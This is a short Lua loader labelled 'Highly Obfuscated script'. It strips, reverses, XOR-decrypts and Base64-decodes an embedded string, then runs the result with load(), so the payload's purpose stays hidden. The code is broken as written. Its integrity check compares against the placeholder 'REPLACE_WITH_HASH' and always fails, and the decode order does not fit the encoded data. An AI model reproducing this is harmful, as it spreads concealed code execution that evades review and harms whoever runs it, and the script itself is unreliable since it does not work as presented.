
-- Highly Obfuscated script
local encodedScript = "w4DDqsOXw6PCg8O7w4DDqcO5w4nDqsOSw7jDqsO+w7jDqMOUw5zCgcOywoHCgcO8w4XCgsOcw6fCgsOpw4TDqMKJw6PDqcOpwoLDqcOyw4rDqMOTw4LCgcOmwoDCgcO8wobDqMOAw6jCgsOqw5vDqMOcw7fCgcOSw4rCg8Omw6fDqMOVw4bDqcKAwoLCg8OSw5rDqMKFw7PCgcOUw4XDqMOmw7fCgcOUw4XCgcKJwoLDqcOpw4nCg8OmwoLDqsOTwoHCg8O6w6fDqMOUw5/CgcOiw6jDqcORw57CgsKFw4nDqcOUw5jCgsO6woPCgsO8w4bCg8Ofw4rCg8OTw4fCg8Oiw7jCgsOUw5/DqsO6w7PDqsO7woDCgcOmwoLCg8Oiw4fDqMOiw7jCgsOUw7nDqsOAw6TDqsOqw4TDqcO2woLDqcOqw5/DqMOTw53Cg8OSw4DDqcO6w7jDqcOUw4rDqMOiw6fDqMOpw4bCg8OIw53CgsOzw7vDqcOxw7TCgsO9w4jDqcOxw6PCgcOgw5fDqsOxw6bDqcOhw6PCg8KFw6fCgsORw77DqsOAw5fCgcO5w5nDqMO6w7PDqcO5wonCg8Oxw4nCgsORw4bDqcKJw7fCgsORw5nCgsOmwoLDqsOmw7vCgsO5w5nCgcOpw5nDqsOxw6PDqMOgw5fDqcOlw6fDqsOSw5jDqcKFw53DqMOTw5zCgsO+w6jDqMOm"
local xorKey = 176

-- Anti-tamper check
local function integrityCheck()
    local originalHash = "REPLACE_WITH_HASH"
    local function hash(str)
        local sum = 0
        for i = 1, #str do
            sum = sum + string.byte(str, i)
        end
        return tostring(sum % 100000)
    end
    if hash(encodedScript) ~= originalHash then
        error("Script integrity check failed!")
    end
end

integrityCheck()

-- Execution environment check
if not _ENV then error("Execution environment compromised!") end

-- Cleanup function to remove junk characters
local function clean(str)
    return str:gsub("[XYZ123]", "")
end

-- Reverse function
local function reverse(str)
    return str:reverse()
end

-- XOR Decryption function
local function xorDecrypt(str, key)
    local decoded = ""
    for i = 1, #str do
        decoded = decoded .. string.char(string.byte(str, i) ~ key)
    end
    return decoded
end

-- Base64 Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the obfuscated script
local scriptFunc = load(decode(xorDecrypt(reverse(clean(encodedScript)), xorKey)))
if scriptFunc then scriptFunc() end
